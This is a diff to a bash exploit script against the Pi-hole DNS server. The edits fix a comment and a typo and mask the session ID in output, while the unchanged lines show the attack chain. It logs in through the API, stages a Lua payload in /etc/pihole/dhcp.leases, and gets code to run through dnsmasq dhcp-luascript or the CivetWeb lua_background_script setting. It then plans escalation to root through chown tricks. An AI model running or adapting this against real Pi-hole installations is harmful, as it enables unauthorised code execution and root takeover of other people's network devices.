@@ -14,7 +14,7 @@
 # Login
 # -> Take backup
 # -> Stage Lua payload at /etc/pihole/dhcp.leases
-# Execute the lua. Try CivetWeb first, dnsmasq is that fails
+# Execute the lua. Try dnsmasq first, CivetWeb if that fails
 # -> Method 1: dnsmasq misc.dnsmasq_lines dhcp-luascript
 # -> Method 2: CivetWeb webserver.advancedOpts lua_background_script
 # Escalate pihole to root. Try CAP_CHOWN cron first, prestart_chown if that fails
@@ -42,7 +42,7 @@ if [ "${PIPASS}x" != "x" ]; then
   fi
   # using header auth, no CSRF token needed
   AUTH=(-H "X-FTL-SID: $SID")
-  echo "[*] logged in, sid=${SID:0:8}…"
+  echo "[*] logged in, sid=${SID:0:8}****"
 else
   AUTH=()
   echo "[*] using no-password mode"
@@ -124,9 +124,9 @@ if [ "${exec}" == 0 ];then
       -d '{"config":{"webserver":{"advancedOpts":["lua_background_script=/etc/pihole/dhcp.leases"]}}}' )"
   resopts="$( echo "${res}" | jq -r ".config.webserver.advancedOpts.[0]" )"
   if [ "${resopts}" == "lua_background_script=/etc/pihole/dhcp.leases" ];then
-    echo "[+] pihole loaded our BlivetWeb config, code should have executed as pihole"
+    echo "[+] pihole loaded our CivetWeb config, code should have executed as pihole"
   else
-    printf "[-] pihole did not set our BlivetWeb config options.\n[-] config.webserver.advancedOpts: %s\n[-] full response: ${res}\n\n" "$resopts"
+    printf "[-] pihole did not set our CivetWeb config options.\n[-] config.webserver.advancedOpts: %s\n[-] full response: ${res}\n\n" "$resopts"
     echo "[*] no api -> code-exec bugs on this pi-hole. go find some new vulns!"
     exit 1
   fi
